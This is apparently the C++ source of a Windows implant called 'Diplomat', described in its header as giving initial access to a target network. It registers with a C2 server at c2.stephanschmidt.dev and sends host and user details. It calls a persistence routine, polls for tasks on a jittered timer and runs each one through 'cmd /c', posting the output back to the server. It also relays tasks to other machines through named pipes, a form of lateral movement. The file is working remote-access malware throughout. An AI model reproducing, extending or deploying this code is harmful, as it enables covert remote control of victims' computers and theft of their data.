/**************************************
 * This exe provides initial access
 * to a target network by establishing
 * persistence and http egress with the
 * linked C2 server
 * ***********************************/


#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <string>

#include "include/json_struct.h"
#include "include/persist.h"
#include "include/investigate.h"

#define BUFSIZE 2048

struct Task{

    std::string Path;
    std::string Command;

    JS_OBJ(Path, Command);
};

struct TaskOutput{
    std::string Hostname;
    std::string Command;
    std::string Output;

    JS_OBJ(Hostname, Command, Output);
};

// Contact C2 and provide basic computer info
void RegisterC2(){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"c2.stephanschmidt.dev", 
            INTERNET_DEFAULT_HTTPS_PORT, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/register",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                std::wstring headers(L"Content-Type: application/json\r\n");
                char* jsonData = (char*) malloc(512);
                wchar_t* productID = ProductID();
                wchar_t* OSRelease = OSName();
                wchar_t* OSBuild = OSVersion();
                wchar_t* username = CurrentUser();
                std::string computerName = ComputerName();
                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName.c_str());
                printf("%s\n", jsonData);
                size_t size = strlen(jsonData) * sizeof(char);

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers.c_str(),
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

// Contact C2 and get commands to run
WINBOOL GetTasks(wchar_t* response){
    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"c2.stephanschmidt.dev", 
            INTERNET_DEFAULT_HTTPS_PORT, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"GET",
                L"/tasks",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                BOOL result = WinHttpSendRequest(
                    request, 
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    -1,
                    WINHTTP_NO_REQUEST_DATA,
                    0,
                    0,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                    DWORD bytesRead = 0;
                    if(WinHttpReadData(request, response, responseSize, &bytesRead)){
                        return TRUE;
                    }
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
    return FALSE;
}

// Send json string to c2
void JsonResponse(char* jsonData, DWORD size){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"c2.stephanschmidt.dev", 
            INTERNET_DEFAULT_HTTPS_PORT, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/taskupload",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                std::wstring headers(L"Content-Type: application/json\r\n");

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers.c_str(),
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}


int _tmain(int argc, _TCHAR *argv[]){
    if(argc == 1){
        // Report intrusion to C2
        RegisterC2();
        printf("Implant Registered.\n");
        PersistMe();

        // Periodically check for new commands from C2
        while(1){
            wchar_t* tasks = (wchar_t*)malloc(1024);
            GetTasks(tasks);

            JS::ParseContext context((char*)tasks);
            Task tr;
            if (context.parseTo(tr) != JS::Error::NoError)
            {
                std::string errorStr = context.makeErrorString();
                fprintf(stderr, "Error parsing struct %s\n", errorStr.c_str());
                return -1;
            }

            printf("Path: %s\n", tr.Path.c_str());

            free(tasks);
            
            if(tr.Command.size() > 0){
                std::string hostname = ComputerName();
                if(tr.Path.compare(hostname) == 0){
                    // Message is intended for this agent
                    // Complete tasks specified in json, return result to C2 server

                    // Construct command string
                    std::string cmd = "cmd /c " + tr.Command;
                    printf("cmd: %s\n", cmd.c_str());

                    // Declare handles for StdOut
                    HANDLE hStdOutRead, hStdOutWrite;
                    STARTUPINFOA si;
                    PROCESS_INFORMATION pi;
                    // Prevent dead squirrels 
                    ZeroMemory(&pi, sizeof(pi));
                    ZeroMemory(&si, sizeof(si));
                    si.cb = sizeof(si);

                    
                    SECURITY_ATTRIBUTES sa;
                    sa.nLength = sizeof(sa);
                    sa.lpSecurityDescriptor = NULL;
                    sa.bInheritHandle = TRUE;

                    BOOL success = CreatePipe(
                        &hStdOutRead,
                        &hStdOutWrite,
                        &sa,
                        0
                    );
                    if(!success)
                        printf("CPipe GLE=%x\n", GetLastError);

                    success = SetHandleInformation(
                        hStdOutRead,
                        HANDLE_FLAG_INHERIT,
                        0
                    );
                    if(!success)
                        printf("SHI GLE=%x\n", GetLastError);
                    

                    si.hStdInput = NULL;
                    si.hStdError = hStdOutWrite;
                    si.hStdOutput = hStdOutWrite;
                    si.dwFlags = STARTF_USESTDHANDLES;

                    // Create the child Processes and wait for it to terminate!
                    success = CreateProcessA(
                        NULL,
                        const_cast<char *>(cmd.c_str()),
                        NULL,
                        NULL,
                        TRUE,
                        0,
                        NULL,
                        NULL,
                        &si,
                        &pi
                    ); 
                    if(!success)
                        printf("CProcess GLE=%x\n", GetLastError);
                    
                    WaitForSingleObject( pi.hProcess, INFINITE );
                    
                    char* buffer = (char*)malloc(1024);
                    DWORD bytesAvail;
                    success = PeekNamedPipe(
                        hStdOutRead, 
                        NULL,
                        0,
                        NULL,
                        &bytesAvail,
                        NULL
                    );
                    if(success && bytesAvail > 0){
                        
                        DWORD bytesRead;
                        success = ReadFile(
                            hStdOutRead,
                            buffer,
                            1024-1,
                            &bytesRead,
                            NULL
                        );
                        if(success){
                            buffer[bytesRead] = '\0';
                        }
                    }

                    CloseHandle( pi.hProcess );
                    CloseHandle( pi.hThread );  
                    CloseHandle( hStdOutRead );
                    CloseHandle( hStdOutWrite );

                    // Construct json struct and serialize it
                    TaskOutput out;
                    out.Hostname = ComputerName();
                    out.Command = tr.Command;
                    out.Output = std::string(buffer);
                    std::string json = JS::serializeStruct(out);

                    // Send json to C2 server
                    JsonResponse(const_cast<char *>(json.c_str()), json.size()*sizeof(char));
                    free(buffer);
                }else{
                    // Message is intended for another agent
                    // Forward json request to next agent
                    // Await potential response (THIS SHOULD PROBABLY BE ASYNC)
                    DWORD cbWritten = 0;
                    BOOL fSuccess = FALSE;

                    // Remove current hostname from path
                    int index = tr.Path.find(',');
                    tr.Path = tr.Path.substr(index+1);
                    // Get name of next host in path
                    index = tr.Path.find(',');
                    std::string nextHostname;
                    if(index == -1){
                        nextHostname = tr.Path;
                    }else{
                        nextHostname = tr.Path.substr(0, index);
                    }
                    // Construct filepath for pipe of next agent
                    std::string agentPath = "\\\\" + nextHostname + "\\pipe\\diplomat";
                    printf("%s\n", agentPath.c_str());

                    // Attempt connection to agent's server pipe
                    HANDLE hPipe = INVALID_HANDLE_VALUE;
                    while(1){ 
                        hPipe = CreateFileA( 
                            agentPath.c_str(),
                            GENERIC_READ | GENERIC_WRITE, 
                            0,
                            NULL,
                            OPEN_EXISTING,
                            0,
                            NULL
                        );
                    
                        if (hPipe != INVALID_HANDLE_VALUE) 
                            break; 
                    
                        if (GetLastError() != ERROR_PIPE_BUSY) {
                            printf("Could not open pipe. GLE=%d\n", GetLastError()); 
                            return -1;
                        }
                    
                        // All pipe instances are busy, so wait for 20 seconds. 
                        if (!WaitNamedPipeA(agentPath.c_str(), 20000)){ 
                            printf("Could not open pipe: 20 second wait timed out."); 
                            return -1;
                        } 

                    }
                    
                    // Pipe is connected
                    // Change to message type pipe
                    DWORD dwMode = PIPE_READMODE_MESSAGE; 
                    fSuccess = SetNamedPipeHandleState( 
                        hPipe,
                        &dwMode,
                        NULL,
                        NULL
                    );
                    if ( ! fSuccess) 
                    {
                        printf("SetNamedPipeHandleState failed. GLE=%d\n", GetLastError()); 
                        return -1;
                    }
                    
                    // Send message to agent's pipe
                    // Put the altered struct back into json format
                    std::string json = JS::serializeStruct(tr);
                    // Write json to pipe
                    fSuccess = WriteFile( 
                        hPipe,
                        json.c_str(),
                        json.size(),
                        &cbWritten,
                        NULL
                    );
                    if (!fSuccess) 
                    {
                        printf("WriteFile to pipe failed. GLE=%d\n", GetLastError()); 
                        return -1;
                    }
                    printf("Message sent to server.\n");

                    // Wait for the request to propogate through the network
                    // Once the response chain finally reaches back to this node,
                    // Return reponse to C2 Server
                    char chResponse[BUFSIZE];
                    DWORD cbRead;
                    do{ 
                        // Read from the pipe. 
                        fSuccess = ReadFile( 
                            hPipe, 
                            chResponse,
                            BUFSIZE*sizeof(char),
                            &cbRead,
                            NULL
                        );
                        if (!fSuccess && GetLastError() != ERROR_MORE_DATA)
                            break; 
                    
                        // Send reponse to C2 server
                        printf("Response: \"%s\"\n", chResponse);
                        
                    }while(!fSuccess);  // Conditional based on ERROR_MORE_DATA 

                    if (!fSuccess){
                        printf("ReadFile from next agent\'s pipe failed. GLE=%d\n", GetLastError());
                        return -1;
                    }

                    CloseHandle(hPipe);
                }
            }else{
                printf("No commands in queue.\n");
            }

            int jitter = (rand() % 20000) - 10000;
            Sleep(30000+jitter);
        }
    }
}